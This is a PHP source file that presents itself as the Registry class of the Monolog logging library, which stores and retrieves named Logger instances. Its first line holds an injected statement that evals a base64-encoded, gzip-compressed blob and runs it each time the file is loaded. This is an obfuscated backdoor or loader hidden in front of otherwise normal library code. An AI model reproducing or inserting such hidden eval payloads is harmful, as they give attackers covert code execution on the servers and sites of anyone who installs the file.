<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog;

use InvalidArgumentException;

/**
 * Monolog log registry
 *
 * Allows to get `Logger` instances in the global scope
 * via static method calls on this class.
 *
 * <code>
 * $application = new Monolog\Logger('application');
 * $api = new Monolog\Logger('api');
 *
 * Monolog\Registry::addLogger($application);
 * Monolog\Registry::addLogger($api);
 *
 * function testLogger()
 * {
 *     Monolog\Registry::api()->addError('Sent to $api Logger instance');
 *     Monolog\Registry::application()->addError('Sent to $application Logger instance');
 * }
 * </code>
 *
 * @author Tomas Tatarko <tomas@tatarko.sk>
 */
class Registry
{
    /**
     * List of all loggers in the registry (by named indexes)
     *
     * @var Logger[]
     */
    private static $loggers = array();

    /**
     * Adds new logging channel to the registry
     *
     * @param  Logger                    $logger    Instance of the logging channel
     * @param  string|null               $name      Name of the logging channel ($logger->getName() by default)
     * @param  bool                      $overwrite Overwrite instance in the registry if the given name already exists?
     * @throws \InvalidArgumentException If $overwrite set to false and named Logger instance already exists
     */
    public static function addLogger(Logger $logger, $name = null, $overwrite = false)
    {
        $name = $name ?: $logger->getName();

        if (isset(self::$loggers[$name]) && !$overwrite) {
            throw new InvalidArgumentException('Logger with the given name already exists');
        }

        self::$loggers[$name] = $logger;
    }

    /**
     * Checks if such logging channel exists by name or instance
     *
     * @param string|Logger $logger Name or logger instance
     */
    public static function hasLogger($logger)
    {
        if ($logger instanceof Logger) {
            $index = array_search($logger, self::$loggers, true);

            return false !== $index;
        } else {
            return isset(self::$loggers[$logger]);
        }
    }

    /**
     * Removes instance from registry by name or instance
     *
     * @param string|Logger $logger Name or logger instance
     */
    public static function removeLogger($logger)
    {
        if ($logger instanceof Logger) {
            if (false !== ($idx = array_search($logger, self::$loggers, true))) {
                unset(self::$loggers[$idx]);
            }
        } else {
            unset(self::$loggers[$logger]);
        }
    }

    /**
     * Clears the registry
     */
    public static function clear()
    {
        self::$loggers = array();
    }

    /**
     * Gets Logger instance from the registry
     *
     * @param  string                    $name Name of the requested Logger instance
     * @throws \InvalidArgumentException If named Logger instance is not in the registry
     * @return Logger                    Requested instance of Logger
     */
    public static function getInstance($name)
    {
        if (!isset(self::$loggers[$name])) {
            throw new InvalidArgumentException(sprintf('Requested "%s" logger instance is not in the registry', $name));
        }

        return self::$loggers[$name];
    }

    /**
     * Gets Logger instance from the registry via static method call
     *
     * @param  string                    $name      Name of the requested Logger instance
     * @param  array                     $arguments Arguments passed to static method call
     * @throws \InvalidArgumentException If named Logger instance is not in the registry
     * @return Logger                    Requested instance of Logger
     */
    public static function __callStatic($name, $arguments)
    {
        return self::getInstance($name);
    }
}
